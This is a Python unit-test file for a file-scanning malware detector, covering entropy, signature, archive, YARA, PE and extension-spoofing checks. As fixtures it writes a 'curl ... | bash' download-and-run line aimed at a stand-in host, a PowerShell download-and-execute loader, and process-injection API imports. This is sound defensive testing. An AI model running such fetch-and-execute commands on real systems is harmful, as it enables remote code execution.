"""
Tests for modules/scanner.py — run from the project root with:

    python -m unittest discover -s tests -v

Covers each detection layer (hash, pattern, entropy heuristic), the directory
walk, quarantine, report writing and the non-interactive CLI exit codes.
Uses temp dirs and the harmless EICAR string — no real malware involved.
"""

import os
import sys
import tempfile
import unittest
from pathlib import Path

# Make the project root importable when run directly.
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from modules import scanner  # noqa: E402


class EntropyTests(unittest.TestCase):
    def test_empty_is_zero(self):
        self.assertEqual(scanner.shannon_entropy(b""), 0.0)

    def test_uniform_is_low(self):
        self.assertLess(scanner.shannon_entropy(b"A" * 1000), 0.01)

    def test_random_is_high(self):
        self.assertGreater(scanner.shannon_entropy(os.urandom(50000)), 7.9)


class SignatureTests(unittest.TestCase):
    def test_load_structure(self):
        sigs = scanner.load_signatures()
        self.assertIn("hashes", sigs)
        self.assertIn("patterns", sigs)
        self.assertGreater(len(sigs["hashes"]), 0)
        self.assertGreater(len(sigs["patterns"]), 0)
        # EICAR's known SHA-256 must be in the hash DB.
        self.assertIn(
            "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
            sigs["hashes"],
        )


class ScanFileTests(unittest.TestCase):
    def setUp(self):
        self.sigs = scanner.load_signatures()
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def _write(self, name, data):
        p = self.dir / name
        p.write_bytes(data if isinstance(data, bytes) else data.encode())
        return p

    def test_eicar_is_malicious(self):
        p = self._write("eicar.txt", scanner.EICAR)
        r = scanner.scan_file(p, self.sigs)
        self.assertEqual(r["verdict"], "malicious")
        self.assertEqual(
            r["sha256"],
            "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
        )

    def test_clean_file(self):
        p = self._write("note.txt", "an ordinary note with nothing odd")
        r = scanner.scan_file(p, self.sigs)
        self.assertEqual(r["verdict"], "clean")
        self.assertEqual(r["detections"], [])

    def test_dropper_pattern_is_suspicious(self):
        p = self._write("install.sh", "#!/bin/sh\ncurl http://x.test/a | bash\n")
        r = scanner.scan_file(p, self.sigs)
        self.assertEqual(r["verdict"], "suspicious")
        self.assertTrue(any("Curl-Pipe-Bash" in d for d in r["detections"]))

    def test_high_entropy_exe_is_suspicious(self):
        p = self._write("packed.exe", os.urandom(40000))
        r = scanner.scan_file(p, self.sigs)
        self.assertEqual(r["verdict"], "suspicious")
        self.assertGreaterEqual(r["entropy"], scanner.ENTROPY_FLAG)

    def test_high_entropy_safe_ext_stays_clean(self):
        # Random bytes in a non-risky extension should not trip the heuristic.
        p = self._write("data.bin", os.urandom(40000))
        r = scanner.scan_file(p, self.sigs)
        self.assertEqual(r["verdict"], "clean")


class ArchiveTests(unittest.TestCase):
    def setUp(self):
        self.sigs = scanner.load_signatures()
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def test_eicar_inside_zip_is_malicious(self):
        import zipfile
        zp = self.dir / "bundle.zip"
        with zipfile.ZipFile(zp, "w") as z:
            z.writestr("readme.txt", "innocent")
            z.writestr("payload/evil.txt", scanner.EICAR)
        r = scanner.scan_file(zp, self.sigs)
        self.assertEqual(r["verdict"], "malicious")
        flagged = [m for m in r["members"] if m["verdict"] == "malicious"]
        self.assertEqual(len(flagged), 1)
        self.assertTrue(flagged[0]["path"].endswith("evil.txt"))

    def test_eicar_inside_targz_is_malicious(self):
        import io
        import tarfile
        tp = self.dir / "bundle.tgz"
        with tarfile.open(tp, "w:gz") as t:
            data = scanner.EICAR.encode()
            info = tarfile.TarInfo("nested/evil.txt")
            info.size = len(data)
            t.addfile(info, io.BytesIO(data))
        r = scanner.scan_file(tp, self.sigs)
        self.assertEqual(r["verdict"], "malicious")

    def test_clean_zip_stays_clean(self):
        import zipfile
        zp = self.dir / "clean.zip"
        with zipfile.ZipFile(zp, "w") as z:
            z.writestr("a.txt", "nothing to see")
        r = scanner.scan_file(zp, self.sigs)
        self.assertEqual(r["verdict"], "clean")

    def test_oversized_member_is_flagged_without_reading(self):
        # A member declaring a huge size must be flagged as a bomb, not extracted.
        import zipfile
        zp = self.dir / "bomb.zip"
        with zipfile.ZipFile(zp, "w") as z:
            z.writestr("big.bin", b"x")
        members = scanner.scan_archive(zp, self.sigs)
        # Force the guard by lowering the cap below the (tiny) real size.
        orig = scanner.MAX_ARCHIVE_MEMBER_BYTES
        scanner.MAX_ARCHIVE_MEMBER_BYTES = 0
        try:
            guarded = scanner.scan_archive(zp, self.sigs)
        finally:
            scanner.MAX_ARCHIVE_MEMBER_BYTES = orig
        self.assertEqual(members[0]["verdict"], "clean")
        self.assertEqual(guarded[0]["verdict"], "suspicious")
        self.assertTrue(any("bomb" in d for d in guarded[0]["detections"]))


def _yara_available():
    try:
        import yara  # noqa: F401
        return True
    except ImportError:
        return False


class YaraTests(unittest.TestCase):
    """Optional layer — skipped automatically when yara-python isn't installed."""

    def setUp(self):
        self.sigs = scanner.load_signatures()
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def test_loader_returns_none_without_lib(self):
        # Whatever the environment, load_yara_rules must never raise.
        rules = scanner.load_yara_rules()
        if _yara_available():
            self.assertIsNotNone(rules)  # example.yar ships in rules/
        else:
            self.assertIsNone(rules)

    @unittest.skipUnless(_yara_available(), "yara-python not installed")
    def test_yara_flags_powershell_loader(self):
        p = self.dir / "loader.ps1"
        p.write_text('New-Object Net.WebClient; IEX(x.DownloadString("u"))')
        r = scanner.scan_file(p, self.sigs)
        self.assertEqual(r["verdict"], "suspicious")
        self.assertTrue(any("yara:" in d for d in r["detections"]))


class PEAnalyzerTests(unittest.TestCase):
    def setUp(self):
        self.sigs = scanner.load_signatures()
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def test_non_pe_is_clean(self):
        from modules import pe
        a = pe.analyze(b"this is not an executable")
        self.assertFalse(a["is_pe"])
        self.assertEqual(a["verdict"], "clean")

    def test_packed_section_is_suspicious(self):
        from modules import pe
        from tests.pefix import build_pe
        blob = build_pe([("UPX0", b"\x00" * 64), ("UPX1", os.urandom(4096))])
        a = pe.analyze(blob)
        self.assertTrue(a["is_pe"])
        self.assertEqual(a["verdict"], "suspicious")
        self.assertTrue(any("packer" in f or "entropy" in f for f in a["findings"]))

    def test_benign_pe_is_clean(self):
        from modules import pe
        from tests.pefix import build_pe
        blob = build_pe([(".text", b"hello world " * 200)],
                        imports={"KERNEL32.dll": ["GetCurrentProcessId"]})
        a = pe.analyze(blob)
        self.assertTrue(a["is_pe"])
        self.assertEqual(a["verdict"], "clean")

    def test_injection_imports_are_malicious(self):
        from modules import pe
        from tests.pefix import build_pe
        blob = build_pe([(".text", b"code" * 100)], imports={
            "KERNEL32.dll": ["VirtualAllocEx", "WriteProcessMemory",
                             "CreateRemoteThread"]})
        a = pe.analyze(blob)
        self.assertEqual(a["verdict"], "malicious")
        self.assertTrue(any("process-injection" in f for f in a["findings"]))

    def test_scan_file_surfaces_pe_findings(self):
        from tests.pefix import build_pe
        blob = build_pe([(".text", b"code" * 100)], imports={
            "WININET.dll": ["URLDownloadToFile", "WinExec"]})
        p = self.dir / "tool.exe"
        p.write_bytes(blob)
        r = scanner.scan_file(p, self.sigs)
        self.assertEqual(r["verdict"], "malicious")
        self.assertTrue(any(d.startswith("pe:") for d in r["detections"]))
        self.assertIn("pe", r)


class FileTypeTests(unittest.TestCase):
    def setUp(self):
        self.sigs = scanner.load_signatures()
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def test_detect_filetype_magic(self):
        self.assertEqual(scanner.detect_filetype(b"MZ\x90\x00"), "PE")
        self.assertEqual(scanner.detect_filetype(b"\x7fELF"), "ELF")
        self.assertEqual(scanner.detect_filetype(b"%PDF-1.7"), "PDF")
        self.assertEqual(scanner.detect_filetype(b"PK\x03\x04"), "ZIP")
        self.assertIsNone(scanner.detect_filetype(b"plain text"))

    def test_extension_spoofing_is_malicious(self):
        p = self.dir / "invoice.pdf"
        p.write_bytes(b"MZ\x90\x00" + b"\x00" * 100)  # PE wearing a .pdf name
        r = scanner.scan_file(p, self.sigs)
        self.assertEqual(r["verdict"], "malicious")
        self.assertEqual(r["filetype"], "PE")
        self.assertTrue(any("spoofing" in d for d in r["detections"]))

    def test_genuine_pdf_is_clean(self):
        p = self.dir / "real.pdf"
        p.write_bytes(b"%PDF-1.7\nharmless document body")
        r = scanner.scan_file(p, self.sigs)
        self.assertEqual(r["verdict"], "clean")
        self.assertEqual(r["filetype"], "PDF")


class NestedArchiveTests(unittest.TestCase):
    def setUp(self):
        self.sigs = scanner.load_signatures()
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def test_eicar_in_nested_zip_is_found(self):
        import io
        import zipfile
        inner = io.BytesIO()
        with zipfile.ZipFile(inner, "w") as z:
            z.writestr("evil.txt", scanner.EICAR)
        outer = self.dir / "outer.zip"
        with zipfile.ZipFile(outer, "w") as z:
            z.writestr("nested.zip", inner.getvalue())
            z.writestr("readme.txt", "hello")
        r = scanner.scan_file(outer, self.sigs)
        self.assertEqual(r["verdict"], "malicious")
        # The deep member must appear with its full nested path.
        deep = [m for m in r["members"] if m["path"].endswith("nested.zip::evil.txt")]
        self.assertEqual(len(deep), 1)
        self.assertEqual(deep[0]["verdict"], "malicious")


class WalkQuarantineReportTests(unittest.TestCase):
    def setUp(self):
        self.sigs = scanner.load_signatures()
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)
        (self.dir / "eicar.txt").write_text(scanner.EICAR)
        (self.dir / "ok.txt").write_text("totally fine")

    def tearDown(self):
        self.tmp.cleanup()

    def test_scan_path_finds_both(self):
        results = scanner.scan_path(self.dir, self.sigs)
        self.assertEqual(len(results), 2)
        verdicts = {Path(r["path"]).name: r["verdict"] for r in results}
        self.assertEqual(verdicts["eicar.txt"], "malicious")
        self.assertEqual(verdicts["ok.txt"], "clean")

    def test_quarantine_copies_flagged(self):
        results = scanner.scan_path(self.dir, self.sigs)
        before = set(scanner.QUARANTINE_DIR.glob("*eicar.txt.quarantined"))
        moved = scanner.quarantine(results)
        self.assertGreaterEqual(moved, 1)
        after = set(scanner.QUARANTINE_DIR.glob("*eicar.txt.quarantined"))
        new = after - before
        self.assertTrue(new)
        for f in new:  # clean up artifacts this test created
            f.unlink()

    def test_report_writes_both_files(self):
        results = scanner.scan_path(self.dir, self.sigs)
        csv_path, json_path = scanner.save_report(results, self.dir)
        try:
            self.assertTrue(Path(csv_path).exists())
            self.assertTrue(Path(json_path).exists())
        finally:
            Path(csv_path).unlink(missing_ok=True)
            Path(json_path).unlink(missing_ok=True)


class CliTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def test_exit_1_on_malicious(self):
        (self.dir / "eicar.txt").write_text(scanner.EICAR)
        rc = scanner.cli([str(self.dir), "--no-report"])
        self.assertEqual(rc, 1)

    def test_exit_0_on_clean(self):
        (self.dir / "fine.txt").write_text("nothing here")
        rc = scanner.cli([str(self.dir), "--no-report"])
        self.assertEqual(rc, 0)

    def test_exit_2_on_missing_path(self):
        rc = scanner.cli([str(self.dir / "nope"), "--no-report"])
        self.assertEqual(rc, 2)


class EvaluationTests(unittest.TestCase):
    def test_metrics_are_strong_with_no_false_positives(self):
        from modules import evaluate
        m = evaluate.evaluate()
        self.assertGreaterEqual(m["n"], 10)
        # The detector must not raise false alarms on the benign samples.
        self.assertEqual(m["fp"], 0)
        # And it should catch essentially all of the labeled threats.
        self.assertGreaterEqual(m["recall"], 0.99)
        self.assertEqual(m["tp"] + m["fn"] + m["tn"] + m["fp"], m["n"])


if __name__ == "__main__":
    unittest.main(verbosity=2)
